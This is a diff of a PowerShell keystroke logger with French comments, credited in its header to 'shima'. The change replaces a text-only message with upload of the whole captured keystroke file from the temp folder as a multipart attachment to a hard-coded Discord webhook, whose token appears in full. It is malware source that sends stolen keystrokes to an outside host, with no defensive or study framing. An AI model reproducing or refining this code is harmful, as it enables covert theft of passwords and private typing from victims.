@@ -1,6 +1,6 @@
 <#
 PowerShell keystroke logger by shima
-Modifié : arrêt automatique + envoi fichier Discord
+Modifié : arrêt automatique + envoi fichier Discord en pièce jointe
 #>
 
 function KeyLog {
@@ -81,30 +81,45 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 # Lancer le keylogger
 KeyLog
 
-# Envoyer le contenu sur Discord (texte simple, pas de fichier)
+# Envoyer le fichier en pièce jointe sur Discord
 $logfile = "$env:temp\key.log"
 $webhook = "https://discord.com/api/webhooks/1197260699768987748/MusyfmoPCs0DkrWb1IH2uQ0Aw6p369foF6pVYynOxL5x0wYokip9_a-kkhpbhWVATEHn"
 
-Write-Host "`nEnvoi sur Discord..." -ForegroundColor Yellow
+Write-Host "`nEnvoi du fichier en piece jointe sur Discord..." -ForegroundColor Yellow
 
 if (Test-Path $logfile) {
     try {
-        $contenu = Get-Content $logfile -Raw
+        # Lire le fichier en bytes
+        $fileBytes = [System.IO.File]::ReadAllBytes($logfile)
+        $fileName = Split-Path $logfile -Leaf
         
-        # Découper si > 2000 caractères (limite Discord)
-        if ($contenu.Length -gt 2000) {
-            $contenu = $contenu.Substring(0, 1997) + "..."
+        # Créer la requête multipart
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+        
+        $bodyLines = @(
+            "--$boundary",
+            'Content-Disposition: form-data; name="payload_json"',
+            "",
+            '{"content":"Fichier keylog joint"}',
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
+            "Content-Type: application/octet-stream",
+            "",
+            [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes),
+            "--$boundary--"
+        )
+        
+        $body = $bodyLines -join $LF
+        
+        $headers = @{
+            "Content-Type" = "multipart/form-data; boundary=$boundary"
         }
         
-        # Format JSON simple et compatible
-        $json = @{
-            content = "Keylog: " + $contenu
-        } | ConvertTo-Json
-        
-        Invoke-RestMethod -Uri $webhook -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop
-        Write-Host "Envoye avec succes !" -ForegroundColor Green
+        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -Headers $headers -ErrorAction Stop
+        Write-Host "Fichier envoye avec succes !" -ForegroundColor Green
     } catch {
-        Write-Host "Erreur Discord : $_" -ForegroundColor Red
+        Write-Host "Erreur : $_" -ForegroundColor Red
     }
 } else {
     Write-Host "Fichier non trouve" -ForegroundColor Red
